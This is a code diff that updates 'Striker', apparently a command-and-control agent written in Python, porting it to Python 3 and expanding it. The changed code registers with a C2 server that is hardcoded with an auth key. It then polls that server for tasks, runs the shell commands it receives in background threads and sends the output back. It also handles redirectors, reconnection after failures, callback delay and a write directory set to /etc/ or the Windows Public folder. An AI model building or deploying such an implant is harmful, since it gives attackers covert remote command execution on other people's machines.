@@ -1,13 +1,31 @@
-#!/usr/bin/python
+#!/usr/bin/python3
 
-import sys, os, subprocess, shlex, requests, json, time
+import sys
+import os
+import subprocess
+import shlex
+import json
+import time
+sleep = time.sleep
+import threading
+import requests
+
+c2URL = "http://localhost:3000"
+authKey = "345c8856fc611d5e3074385404550268"
+delay = 5
+MAX_FAILED_CONNS = 5
 
 class Striker:
 
-  def __init__(self, hosts):
-    self.hosts = hosts
-    self.server = {}
+  def __init__(self, servers, authKey, delay):
+    self.abort = False
+    self.servers = servers
+    self.authKey = authKey
+    self.delay = int(delay)
+    self.baseUrl = ""
+    self.uid = ""
     self.config = {}
+    self.tasks = {}
     self.os = os.name
     self.user = os.getenv("USER")
     self.hostname = "unknown"
@@ -19,6 +37,30 @@ class Striker:
         pass
     elif (os.name in ["nt"]):
       self.os = "windows"
+    self.writeDir = os.getcwd()
+    if self.os == "linux":
+      self.writeDir = "/etc/"
+    elif self.os == "windows":
+      self.writeDir = "C:\\users\\Public\\"
+    else:
+      if self.writeDir[-1] != "/":
+        self.writeDir += "/"
+
+  def httpGet(self, url):
+    try:
+      res = requests.get(url)
+      return (res.status_code, res.text)
+    except Exception as e:
+      print("[-] Error making GET request to %s: %s" %(url, str(e)))
+      return (0, str(e))
+
+  def httpPost(self, url, body):
+    try:
+      res = requests.post(url, json=body)
+      return (res.status_code, res.text)
+    except Exception as e:
+      print("[-] Error making POST request to %s: %s" %(url, str(e)))
+      return (0, str(e))
 
   def info(self):
     return {
@@ -30,56 +72,118 @@ class Striker:
     }
 
   def execTask(self, task):
-    print(task)
     taskID = task['uid']
-    data = task['data']
+    data = {}
+    try:
+      data = task['data']
+    except KeyError:
+      pass
     result = "Not implemented!"
-    if (task['taskType'] == "system"):
+    if (task["taskType"] == "system"):
       cmd = data['cmd']
       try:
         proc = subprocess.Popen(shlex.split(cmd), stdin=subprocess.PIPE, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
-        result = proc.stderr.read() + proc.stdout.read()
-      except Exception, e:
-        result = "Error running task: " + str(e)
-    return {"uid":taskID, "result":result}
+        result = (proc.stderr.read() + proc.stdout.read()).decode()
+      except Exception as e:
+        result = "Error running shell command: " + str(e)
+    elif (task["taskType"] == "abort"):
+      self.abort = True
+      result = "Session aborted!"
+    elif (task["taskType"] == "writedir"):
+      self.writeDir = data["dir"]
+      if self.os == "windows" and self.writeDir[-1] != "\\":
+        self.writeDir += "\\"
+      elif self.writeDir[-1] != "/":
+        self.writeDir += "/"
+      result = "Write directory updated: " + self.writeDir
+    elif (task["taskType"] == "delay"):
+      self.delay = int(data["delay"])
+      result = "Updated callback delay to %d secs" %(self.delay)
+    elif (task["taskType"] == "cd"):
+      try:
+        os.chdir(data["dir"])
+        result = "Changed working directory: " + os.getcwd()
+      except FileNotFoundError as e:
+        result = "Erro changing working directory: " + str(e)
+    task["result"] = {"uid":taskID, "result":result}
+    task["finished"] = True
 
-  def main(self):
-    for host in self.hosts:
-      if (host['proto'] in ['http', 'https']):
-        print("[+] Connecting to %s" %(host['host']));
-        baseUrl = host['proto'] + "://" + host['host'] + ":" + str(host['port'])
-        try:
-          rsp = requests.post(baseUrl + "/agent/init", data=self.info())
-          if (rsp.status_code != 200):
-            print("[-] Non-200 response code!")
-            continue
-          data = json.loads(rsp.text);
-          print(data)
-          self.server = host
-          self.config = data
-        except Exception, e:
-          print("[-] Error: " + str(e))
-    if (self.server and self.server['proto'] in ['http', 'https']):
-      baseUrl = self.server['proto'] + "://" + self.server['host'] + ":" + str(host['port'])
-      uid = self.config['uid']
-      delay = int(self.config['delay'])
-      while True:
-        time.sleep(delay)
-        results = []
-        rsp = ""
-        try:
-          rsp = requests.get(baseUrl + "/agent/tasks/" + uid)
-        except Exception, e:
-          print(str(e))
+  def connectToBase(self):
+    connected = False
+    status = 0
+    body = "{}"
+    print("[*] Connecting to C2 server...");
+    data = self.info()
+    data["key"] = self.authKey
+    freshConn = True
+    while not connected:
+      for url in self.servers:
+        status = 0
+        body = ""
+        if self.uid:
+          status, body = self.httpGet(url + "/agent/ping/" + self.uid)
+          freshConn = False
+        else:
+          status, body = self.httpPost(url + "/agent/init", data)
+        if (status != 200):
+          sleep(self.delay)
           continue
-        tasks = json.loads(rsp.text)
-        for task in tasks:
-          taskID = task['uid']
-          result = self.execTask(task)
-          results.append(result)
-        if (len(results) > 0):
-          rsp = requests.post(baseUrl + "/agent/tasks/" + uid, json=results)
+        self.baseUrl = url
+        connected = True
+        break
+    print("[+] Connected to: %s" %(self.baseUrl))
+    if not freshConn:
+      return True
+    self.config = json.loads(body)
+    print(self.config)
+    self.uid = self.config["uid"]
+    for url in self.config["redirectors"]:
+      if not url in self.servers: self.servers.append(url)
+    return True
+
+  def start(self):
+    self.connectToBase();
+    failedConns = 0
+    while True:
+      if failedConns >= MAX_FAILED_CONNS:
+        self.connectToBase()
+        failedConns = 0
+        continue
+      eTime = time.time() + self.delay
+      while time.time() < eTime:
+        sleep(1)
+        taskResults = []
+        for taskID in self.tasks:
+          if (self.tasks[taskID]["finished"]):
+            taskResults.append(self.tasks[taskID]["result"])
+        if len(taskResults) > 0:
+          print("[*] Sending %d results..." %(len(taskResults)))
+          status, body = self.httpPost(self.baseUrl + "/agent/tasks/" + self.uid, taskResults)
+          if (status != 200):
+            continue
+          failedConns = 0
+          for result in taskResults:
+            del self.tasks[result["uid"]]
+      if self.abort:
+        break
+      status, body = self.httpGet(self.baseUrl + "/agent/tasks/" + self.uid)
+      if status != 200:
+        failedConns += 1
+        continue
+      newTasks = json.loads(body)
+      if len(newTasks) == 0:
+        continue
+      print("[+] %d new tasks received!" %(len(newTasks)))
+      for task in newTasks:
+        task["finished"] = False
+        self.tasks[task["uid"]] = task
+        t = threading.Thread(target=self.execTask, args=(task,))
+        t.start()
+    return
 
 if __name__ == '__main__':
-  striker = Striker([{"proto": "http", "host":"127.0.0.1", "port":3000}])
-  striker.main();
+  striker = Striker([c2URL], authKey, delay)
+  try:
+    striker.start()
+  except KeyboardInterrupt:
+    sys.exit(0)
